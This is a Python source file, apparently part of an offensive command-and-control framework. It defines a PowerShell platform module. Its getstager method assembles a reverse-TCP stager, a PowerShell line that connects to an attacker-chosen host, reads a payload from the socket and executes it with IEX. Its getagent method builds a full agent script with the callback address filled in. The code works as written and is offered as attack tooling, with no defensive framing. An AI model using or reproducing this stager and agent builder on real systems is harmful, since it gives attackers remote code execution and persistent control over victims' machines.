
from helpers.log import *
import helpers.strings as helps
from ..platform import Platform
from helpers.modulebase import ModuleBase
import os.path

DEBUG_MODULE = "PlatformPowershell"
MAX_AGENT_LEN = 102400

class PlatformPowershell(Platform, ModuleBase):
    """
    platform code to provide a stager and an agent generator for powershell
    """

    def __init__(self):
        """
        powershell plattform code
        """

        self.options = {
            'STAGED' : {
                'Description'   :   'Is the communication setup staged or not?',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            }
        }
        self.platformpath = os.path.abspath(os.path.dirname(__file__))

    def isstaged(self):
        """
        powershell platform can be staged by setting the option
        """

        return (self.options['STAGED']['Value'] == "TRUE")
    
    def getstager(self, handler):
        """
        Generate the stager string
        """

        if not self.isstaged():
            print_error("Platform is not staged. Consider changing option STAGED or generating agent directly.")
            return None
        if not handler.transport:
            print_error("Transport not set")
            return None

        # generate powershell + reversetcp stager
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            ip = handler.transport.options['CONNECTHOST']['Value'] or handler.transport.options['LHOST']['Value']
            if ip == "0.0.0.0":
                print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                return None
            port = handler.transport.options['CONNECTPORT']['Value'] or handler.transport.options['LPORT']['Value']
            print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))
            # TODO: Consider using helps.randomize_capitalization(...)
            stager = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip,port)
            stager += '$a=New-Object char[]({});'.format(MAX_AGENT_LEN)
            stager += '$r=New-Object IO.StreamReader($c.GetStream());'
            stager += '$b=$r.Read($a,0,{});'.format(MAX_AGENT_LEN)
            stager += '$s=New-Object String($a,0,$b);'
            stager += 'IEX $s;'
            print_debug(DEBUG_MODULE, "stager = {}".format(stager))
            return helps.powershell_launcher(stager)

        # combination platform / transport currently not supported 
        else:
            print_error("No stager for platform and transport found.")
            return None

    def getagent(self, handler):
        """
        Generate the full powershell agent string for this setup if possible
        """

        print_debug("DEBUG_MODULE", "platformpath = {}".format(self.platformpath))
        agent = ""

        # add selected transport implementation
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            f = open(self.platformpath + "/transport/reversetcp.ps1", 'r')

        # combination platform / transport currently not supported 
        else:
            print_error("No agent module for platform and transport found.")
            return None
        agent += f.read()
        f.close()

        # add message basics
        f = open(self.platformpath + "/message/message.ps1", 'r')
        agent += f.read()
        f.close()
        
        # add agent base code
        f = open(self.platformpath + "/agent.ps1", 'r')
        agent += f.read()
        f.close()

        # strip comments and empty lines
        agent = helps.strip_powershell_comments(agent)

        # get and replace some values
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            ip = handler.transport.options['CONNECTHOST']['Value'] or handler.transport.options['LHOST']['Value']
            if ip == "0.0.0.0":
                print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                return None
            port = handler.transport.options['CONNECTPORT']['Value'] or handler.transport.options['LPORT']['Value']
            print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))

            agent = agent.replace('SYREPLACE_CONNECTIONMETHOD', "TCP")
            agent = agent.replace('SYREPLACE_CONNECTHOST', str(ip))
            agent = agent.replace('SYREPLACE_CONNECTPORT', str(port))

        # combination platform / transport currently not supported 
        else:
            print_error("No agent module for platform and transport found.")
            return None

        if len(agent) > MAX_AGENT_LEN and self.isstaged():
            print_error("agent is longer than stager buffer, staging will fail")
        return agent

